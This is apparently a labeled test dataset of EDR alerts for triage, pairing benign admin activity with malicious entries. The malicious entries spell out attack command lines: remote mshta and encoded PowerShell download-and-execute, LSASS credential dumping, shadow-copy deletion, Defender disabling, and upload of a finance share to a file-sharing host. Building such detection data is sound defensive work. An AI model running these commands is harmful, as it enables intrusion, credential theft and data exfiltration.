@@ -1,0 +1,624 @@
+[
+  {
+    "id": "edr-01",
+    "label": "malicious",
+    "why": "ClickFix fake-CAPTCHA -> mshta (T1204/T1218.005)",
+    "alert": {
+      "alert_id": "EDR-2026-4401",
+      "rule_name": "Suspicious mshta spawned from browser",
+      "severity": "high",
+      "device": {
+        "hostname": "WS-MKTG-14",
+        "os": "Windows 11 24H2"
+      },
+      "user": "CORP\\d.owusu",
+      "process": {
+        "name": "mshta.exe",
+        "path": "C:\\Windows\\System32\\mshta.exe",
+        "command_line": "mshta.exe https://verify-human-cloudflarecdn[.]com/check.mp4",
+        "parent_process_name": "msedge.exe"
+      },
+      "detection": {
+        "source": "RunMRU",
+        "note": "reCAPTCHA Verification ID pasted into Run dialog"
+      }
+    }
+  },
+  {
+    "id": "edr-02",
+    "label": "benign",
+    "why": "employee opened a real vendor invoice PDF",
+    "alert": {
+      "alert_id": "EDR-2026-4402",
+      "rule_name": "Office child process",
+      "severity": "informational",
+      "device": {
+        "hostname": "WS-FIN-08",
+        "os": "Windows 11 23H2"
+      },
+      "user": "CORP\\a.romano",
+      "process": {
+        "name": "AcroRd32.exe",
+        "path": "C:\\Program Files\\Adobe\\Acrobat\\Acrobat\\AcroRd32.exe",
+        "command_line": "\"AcroRd32.exe\" \"C:\\Users\\a.romano\\Downloads\\Invoice_88213.pdf\"",
+        "parent_process_name": "OUTLOOK.EXE",
+        "signed": true,
+        "signer": "Adobe Inc."
+      }
+    }
+  },
+  {
+    "id": "edr-03",
+    "label": "malicious",
+    "why": "LNK spoofing CVE-2025-9491 -> powershell (T1204.001)",
+    "alert": {
+      "alert_id": "EDR-2026-4403",
+      "rule_name": "LNK launches hidden PowerShell",
+      "severity": "high",
+      "device": {
+        "hostname": "WS-HR-21",
+        "os": "Windows 10 22H2"
+      },
+      "user": "CORP\\l.becker",
+      "file": {
+        "name": "Resume_2026.pdf.lnk",
+        "path": "C:\\Users\\l.becker\\Downloads\\Resume_2026.pdf.lnk",
+        "cve": "CVE-2025-9491"
+      },
+      "process": {
+        "name": "powershell.exe",
+        "command_line": "powershell -nop -w hidden -e aQB3AHIAIABoAHQAdABwAHMAOgAvAC8AcgBhAHcALgBnAGkAdABoAHUAYgB1AHMAZQByAGMAbwBuAHQAZQBuAHQAWwAuAF0AYwBvAG0ALwBhAG4AbwBuADUANQAyADEALwB4AC8AbQBhAGkAbgAvAGEALgBwAHMAMQAgAC0AbwAgACQAZQBuAHYAOgBUAEUATQBQAFwAcwAuAHAAcwAxADsAIABpAGUAeAAgACgAZwBjACAAJABlAG4AdgA6AFQARQBNAFAAXABzAC4AcABzADEAIAAtAHIAYQB3ACkA",
+        "parent_process_name": "explorer.exe"
+      }
+    }
+  },
+  {
+    "id": "edr-04",
+    "label": "malicious",
+    "why": "Zombie ZIP CVE-2026-0866 (T1027)",
+    "alert": {
+      "alert_id": "EDR-2026-4404",
+      "rule_name": "Archive with malformed central directory extracted",
+      "severity": "medium",
+      "device": {
+        "hostname": "WS-SALES-03",
+        "os": "Windows 11 24H2"
+      },
+      "user": "CORP\\p.nkemelu",
+      "file": {
+        "name": "PurchaseOrder.zip",
+        "path": "C:\\Users\\p.nkemelu\\Downloads\\PurchaseOrder.zip",
+        "cve": "CVE-2026-0866",
+        "note": "central-directory header mismatch; AV scan skipped contents",
+        "entropy": 7.7
+      },
+      "extracted": {
+        "name": "PurchaseOrder.scr",
+        "operation": "FileCreate"
+      }
+    }
+  },
+  {
+    "id": "edr-05",
+    "label": "benign",
+    "why": "IT deployed software via Intune",
+    "alert": {
+      "alert_id": "EDR-2026-4405",
+      "rule_name": "MSI install from system context",
+      "severity": "informational",
+      "device": {
+        "hostname": "WS-ENG-45",
+        "os": "Windows 11 24H2"
+      },
+      "user": "NT AUTHORITY\\SYSTEM",
+      "process": {
+        "name": "msiexec.exe",
+        "command_line": "msiexec.exe /i C:\\Windows\\ccmcache\\3f\\Slack.msi /qn",
+        "parent_process_name": "ccmexec.exe",
+        "signed": true,
+        "signer": "Microsoft Corporation"
+      },
+      "context": {
+        "deployment": "Intune/SCCM",
+        "collection": "All-Workstations"
+      }
+    }
+  },
+  {
+    "id": "edr-06",
+    "label": "malicious",
+    "why": "FileFix -> curl+tar loader chain (T1059/T1105)",
+    "alert": {
+      "alert_id": "EDR-2026-4406",
+      "rule_name": "forfiles proxy execution chain",
+      "severity": "high",
+      "device": {
+        "hostname": "WS-MKTG-14",
+        "os": "Windows 11 24H2"
+      },
+      "user": "CORP\\d.owusu",
+      "process": {
+        "name": "forfiles.exe",
+        "command_line": "forfiles /p c:\\windows\\system32 /m notepad.exe /c \"mshta https://cdn-telemetry-sync[.]com/p.hta\"",
+        "parent_process_name": "explorer.exe"
+      },
+      "followed_by": [
+        "mshta.exe",
+        "powershell.exe",
+        "curl.exe https://cdn-telemetry-sync[.]com/n.tar -o %TEMP%\\n.tar",
+        "tar.exe -xf %TEMP%\\n.tar -C %APPDATA%"
+      ]
+    }
+  },
+  {
+    "id": "edr-08",
+    "label": "benign",
+    "why": "developer compiling with csc via MSBuild",
+    "alert": {
+      "alert_id": "EDR-2026-4408",
+      "rule_name": ".NET compiler invoked",
+      "severity": "informational",
+      "device": {
+        "hostname": "WS-ENG-45",
+        "os": "Windows 11 24H2"
+      },
+      "user": "CORP\\s.iyer",
+      "process": {
+        "name": "csc.exe",
+        "command_line": "\"C:\\Program Files\\dotnet\\sdk\\9.0.100\\Roslyn\\bincore\\csc.dll\" @obj\\Debug\\net9.0\\csc.rsp",
+        "parent_process_name": "MSBuild.exe",
+        "signed": true,
+        "signer": "Microsoft Corporation"
+      }
+    }
+  },
+  {
+    "id": "edr-09",
+    "label": "malicious",
+    "why": "regsvcs AppLocker bypass scriptlet (T1218)",
+    "alert": {
+      "alert_id": "EDR-2026-4409",
+      "rule_name": "regsvcs loading remote scriptlet",
+      "severity": "high",
+      "device": {
+        "hostname": "WS-SALES-03",
+        "os": "Windows 11 24H2"
+      },
+      "user": "CORP\\p.nkemelu",
+      "process": {
+        "name": "regsvcs.exe",
+        "command_line": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\regsvcs.exe /U C:\\Users\\p.nkemelu\\AppData\\Local\\Temp\\loader.dll",
+        "parent_process_name": "PurchaseOrder.scr"
+      }
+    }
+  },
+  {
+    "id": "edr-10",
+    "label": "malicious",
+    "why": "r77 rootkit-style Run key to APPDATA (T1547.001)",
+    "alert": {
+      "alert_id": "EDR-2026-4410",
+      "rule_name": "Autorun value points to user-writable path",
+      "severity": "high",
+      "device": {
+        "hostname": "WS-MKTG-14",
+        "os": "Windows 11 24H2"
+      },
+      "user": "CORP\\d.owusu",
+      "process": {
+        "name": "reg.exe",
+        "command_line": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v OneDriveSync /t REG_SZ /d \"%APPDATA%\\Roaming\\svc\\updater.exe\" /f",
+        "parent_process_name": "powershell.exe"
+      }
+    }
+  },
+  {
+    "id": "edr-11",
+    "label": "benign",
+    "why": "GPO creates a scheduled task",
+    "alert": {
+      "alert_id": "EDR-2026-4411",
+      "rule_name": "Scheduled task created",
+      "severity": "informational",
+      "device": {
+        "hostname": "WS-FIN-08",
+        "os": "Windows 11 23H2"
+      },
+      "user": "NT AUTHORITY\\SYSTEM",
+      "process": {
+        "name": "schtasks.exe",
+        "command_line": "schtasks /create /tn \"CorpAV\\DailyScan\" /xml C:\\Windows\\Temp\\scan.xml /f",
+        "parent_process_name": "svchost.exe",
+        "signed": true
+      },
+      "context": {
+        "source": "Group Policy",
+        "gpo": "Endpoint-Protection-Baseline"
+      }
+    }
+  },
+  {
+    "id": "edr-12",
+    "label": "malicious",
+    "why": "COM hijack via scheduled task calling rundll32 (T1546.015)",
+    "alert": {
+      "alert_id": "EDR-2026-4412",
+      "rule_name": "Scheduled task runs rundll32 on user DLL",
+      "severity": "high",
+      "device": {
+        "hostname": "WS-HR-21",
+        "os": "Windows 10 22H2"
+      },
+      "user": "CORP\\l.becker",
+      "process": {
+        "name": "schtasks.exe",
+        "command_line": "schtasks /create /sc onlogon /tn \\Microsoft\\Windows\\WlanSvc /tr \"rundll32.exe C:\\Users\\l.becker\\AppData\\Local\\wlan.dll,Start\" /f",
+        "parent_process_name": "cmd.exe"
+      }
+    }
+  },
+  {
+    "id": "edr-13",
+    "label": "malicious",
+    "why": "BYOVD EDRKillShifter drops vulnerable driver (T1562.001/T1068)",
+    "alert": {
+      "alert_id": "EDR-2026-4413",
+      "rule_name": "Unsigned service loads known-vulnerable driver",
+      "severity": "critical",
+      "device": {
+        "hostname": "SRV-APP-07",
+        "os": "Windows Server 2022"
+      },
+      "user": "CORP\\svc_deploy",
+      "file": {
+        "name": "aukill.sys",
+        "path": "C:\\Windows\\Temp\\aukill.sys",
+        "entropy": 7.1,
+        "note": "signed but on LOLDrivers blocklist"
+      },
+      "process": {
+        "name": "sc.exe",
+        "command_line": "sc create hwaudk binPath= C:\\Windows\\Temp\\aukill.sys type= kernel start= demand",
+        "parent_process_name": "EDRKillShifter.exe"
+      },
+      "behavior": "loads driver then issues IOCTL to terminate protected AV processes"
+    }
+  },
+  {
+    "id": "edr-14",
+    "label": "malicious",
+    "why": "Defender exclusion + real-time off (T1562.001)",
+    "alert": {
+      "alert_id": "EDR-2026-4414",
+      "rule_name": "Defender tampering",
+      "severity": "high",
+      "device": {
+        "hostname": "SRV-APP-07",
+        "os": "Windows Server 2022"
+      },
+      "user": "CORP\\svc_deploy",
+      "process": {
+        "name": "powershell.exe",
+        "command_line": "powershell Add-MpPreference -ExclusionPath 'C:\\ProgramData\\sync'; Set-MpPreference -DisableRealtimeMonitoring $true",
+        "parent_process_name": "cmd.exe"
+      }
+    }
+  },
+  {
+    "id": "edr-15",
+    "label": "benign",
+    "why": "security team runs an authorized vulnerability scan",
+    "alert": {
+      "alert_id": "EDR-2026-4415",
+      "rule_name": "Network scanning behavior",
+      "severity": "low",
+      "device": {
+        "hostname": "SRV-SEC-02",
+        "os": "Windows Server 2022"
+      },
+      "user": "CORP\\svc_nessus",
+      "process": {
+        "name": "nessusd.exe",
+        "command_line": "nessusd.exe -q",
+        "parent_process_name": "services.exe",
+        "signed": true,
+        "signer": "Tenable, Inc."
+      },
+      "analyst_note": "Scheduled monthly authenticated scan, change CHG-77120, security team owns svc_nessus"
+    }
+  },
+  {
+    "id": "edr-16",
+    "label": "malicious",
+    "why": "shadow copy deletion before encryption (T1490)",
+    "alert": {
+      "alert_id": "EDR-2026-4416",
+      "rule_name": "Volume shadow copies deleted",
+      "severity": "critical",
+      "device": {
+        "hostname": "SRV-FS-01",
+        "os": "Windows Server 2022"
+      },
+      "user": "CORP\\svc_deploy",
+      "process": {
+        "name": "vssadmin.exe",
+        "command_line": "vssadmin delete shadows /all /quiet",
+        "parent_process_name": "powershell.exe"
+      }
+    }
+  },
+  {
+    "id": "edr-17",
+    "label": "malicious",
+    "why": "LSASS dump via comsvcs MiniDump (T1003.001)",
+    "alert": {
+      "alert_id": "EDR-2026-4417",
+      "rule_name": "comsvcs.dll MiniDump on lsass",
+      "severity": "critical",
+      "device": {
+        "hostname": "SRV-APP-07",
+        "os": "Windows Server 2022"
+      },
+      "user": "CORP\\svc_deploy",
+      "process": {
+        "name": "rundll32.exe",
+        "command_line": "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 712 C:\\Windows\\Temp\\l.dmp full",
+        "parent_process_name": "cmd.exe"
+      }
+    }
+  },
+  {
+    "id": "edr-19",
+    "label": "benign",
+    "why": "admin runs certutil to hash an ISO",
+    "alert": {
+      "alert_id": "EDR-2026-4419",
+      "rule_name": "certutil hashfile",
+      "severity": "informational",
+      "device": {
+        "hostname": "WS-ENG-45",
+        "os": "Windows 11 24H2"
+      },
+      "user": "CORP\\s.iyer",
+      "process": {
+        "name": "certutil.exe",
+        "command_line": "certutil -hashfile C:\\iso\\win11_24h2.iso SHA256",
+        "parent_process_name": "cmd.exe",
+        "signed": true,
+        "signer": "Microsoft Corporation"
+      }
+    }
+  },
+  {
+    "id": "edr-21",
+    "label": "benign",
+    "why": "helpdesk checks group membership",
+    "alert": {
+      "alert_id": "EDR-2026-4421",
+      "rule_name": "net group query",
+      "severity": "informational",
+      "device": {
+        "hostname": "WS-IT-02",
+        "os": "Windows 11 24H2"
+      },
+      "user": "CORP\\t.helpdesk",
+      "process": {
+        "name": "net.exe",
+        "command_line": "net user j.smith /domain",
+        "parent_process_name": "cmd.exe"
+      },
+      "analyst_note": "Helpdesk resolving a ticket; t.helpdesk is IT support"
+    }
+  },
+  {
+    "id": "edr-22",
+    "label": "malicious",
+    "why": "WMI remote process create to another host (T1047)",
+    "alert": {
+      "alert_id": "EDR-2026-4422",
+      "rule_name": "Remote WMI process creation",
+      "severity": "high",
+      "device": {
+        "hostname": "SRV-APP-07",
+        "os": "Windows Server 2022"
+      },
+      "user": "CORP\\svc_deploy",
+      "process": {
+        "name": "wmic.exe",
+        "command_line": "wmic /node:10.20.4.51 /user:CORP\\Administrator process call create \"cmd /c certutil -urlcache -f http://10.20.4.42/b.exe c:\\b.exe & c:\\b.exe\"",
+        "parent_process_name": "cmd.exe"
+      },
+      "network": [
+        {
+          "dst_ip": "10.20.4.51",
+          "dst_port": 135
+        }
+      ]
+    }
+  },
+  {
+    "id": "edr-23",
+    "label": "benign",
+    "why": "admin uses PsExec for an approved patch push",
+    "alert": {
+      "alert_id": "EDR-2026-4423",
+      "rule_name": "PsExec remote execution",
+      "severity": "low",
+      "device": {
+        "hostname": "SRV-MGMT-01",
+        "os": "Windows Server 2022"
+      },
+      "user": "CORP\\svc_patching",
+      "process": {
+        "name": "PsExec64.exe",
+        "command_line": "PsExec64.exe \\\\SRV-APP-08 -s C:\\Tools\\patch_agent.exe /install",
+        "parent_process_name": "cmd.exe",
+        "signed": true,
+        "signer": "Microsoft Corporation"
+      },
+      "analyst_note": "Monthly patch window CHG-44213; svc_patching is the patch automation account"
+    }
+  },
+  {
+    "id": "edr-25",
+    "label": "malicious",
+    "why": "C2 over Telegram Bot API (T1102/T1071)",
+    "alert": {
+      "alert_id": "EDR-2026-4425",
+      "rule_name": "Beaconing to messaging API",
+      "severity": "high",
+      "device": {
+        "hostname": "WS-MKTG-14",
+        "os": "Windows 11 24H2"
+      },
+      "user": "CORP\\d.owusu",
+      "process": {
+        "name": "updater.exe",
+        "path": "C:\\Users\\d.owusu\\AppData\\Roaming\\svc\\updater.exe"
+      },
+      "network": [
+        {
+          "dst": "api.telegram.org",
+          "dst_port": 443,
+          "interval_sec": 60,
+          "count": 45,
+          "bytes_out": 210
+        }
+      ],
+      "note": "regular 60s POSTs to a bot endpoint from a non-browser binary"
+    }
+  },
+  {
+    "id": "edr-26",
+    "label": "benign",
+    "why": "Teams/Graph normal cloud traffic",
+    "alert": {
+      "alert_id": "EDR-2026-4426",
+      "rule_name": "Repeated HTTPS to cloud service",
+      "severity": "informational",
+      "device": {
+        "hostname": "WS-FIN-08",
+        "os": "Windows 11 23H2"
+      },
+      "user": "CORP\\a.romano",
+      "process": {
+        "name": "ms-teams.exe",
+        "signed": true,
+        "signer": "Microsoft Corporation"
+      },
+      "network": [
+        {
+          "dst": "graph.microsoft.com",
+          "dst_port": 443,
+          "interval_sec": 30,
+          "count": 200
+        }
+      ]
+    }
+  },
+  {
+    "id": "edr-27",
+    "label": "malicious",
+    "why": "C2 dead-drop resolver on GitHub raw (T1102.001)",
+    "alert": {
+      "alert_id": "EDR-2026-4427",
+      "rule_name": "Non-browser process pulls config from code host",
+      "severity": "medium",
+      "device": {
+        "hostname": "WS-SALES-03",
+        "os": "Windows 11 24H2"
+      },
+      "user": "CORP\\p.nkemelu",
+      "process": {
+        "name": "PurchaseOrder.scr"
+      },
+      "network": [
+        {
+          "dst": "raw.githubusercontent.com",
+          "url": "https://raw.githubusercontent[.]com/anon5521/cfg/main/beacon.txt",
+          "dst_port": 443,
+          "interval_sec": 300
+        }
+      ]
+    }
+  },
+  {
+    "id": "edr-28",
+    "label": "malicious",
+    "why": "archive then upload to paste/file share (T1560/T1567)",
+    "alert": {
+      "alert_id": "EDR-2026-4428",
+      "rule_name": "Staging archive uploaded to file-sharing",
+      "severity": "high",
+      "device": {
+        "hostname": "SRV-FS-01",
+        "os": "Windows Server 2022"
+      },
+      "user": "CORP\\svc_deploy",
+      "process": {
+        "name": "powershell.exe",
+        "command_line": "powershell Compress-Archive -Path \\\\SRV-FS-01\\Finance\\* -DestinationPath $env:TEMP\\f.zip; curl.exe -T $env:TEMP\\f.zip https://transfer[.]sh/f.zip",
+        "parent_process_name": "cmd.exe"
+      },
+      "network": [
+        {
+          "dst": "transfer.sh",
+          "bytes_out": 734003200
+        }
+      ]
+    }
+  },
+  {
+    "id": "edr-29",
+    "label": "benign",
+    "why": "nightly backup job copies to NAS",
+    "alert": {
+      "alert_id": "EDR-2026-4429",
+      "rule_name": "Large outbound internal transfer",
+      "severity": "informational",
+      "device": {
+        "hostname": "SRV-FS-01",
+        "os": "Windows Server 2022"
+      },
+      "user": "NT AUTHORITY\\SYSTEM",
+      "process": {
+        "name": "robocopy.exe",
+        "command_line": "robocopy D:\\Shares \\\\NAS-BKP-01\\nightly /MIR /R:1 /W:1",
+        "parent_process_name": "taskeng.exe"
+      },
+      "network": [
+        {
+          "dst_ip": "10.20.9.10",
+          "bytes_out": 5368709120,
+          "internal": true
+        }
+      ],
+      "analyst_note": "Scheduled nightly backup to on-prem NAS"
+    }
+  },
+  {
+    "id": "edr-30",
+    "label": "malicious",
+    "why": "mass file rename/encryption + ransom note (T1486)",
+    "alert": {
+      "alert_id": "EDR-2026-4430",
+      "rule_name": "Rapid mass file modification with new extension",
+      "severity": "critical",
+      "device": {
+        "hostname": "SRV-FS-01",
+        "os": "Windows Server 2022"
+      },
+      "user": "CORP\\svc_deploy",
+      "process": {
+        "name": "svc.exe",
+        "path": "C:\\ProgramData\\sync\\svc.exe"
+      },
+      "file_activity": {
+        "renamed_count": 21430,
+        "new_extension": ".LOCKD",
+        "ransom_note": "RESTORE-FILES.txt",
+        "window_sec": 90
+      }
+    }
+  }
+]
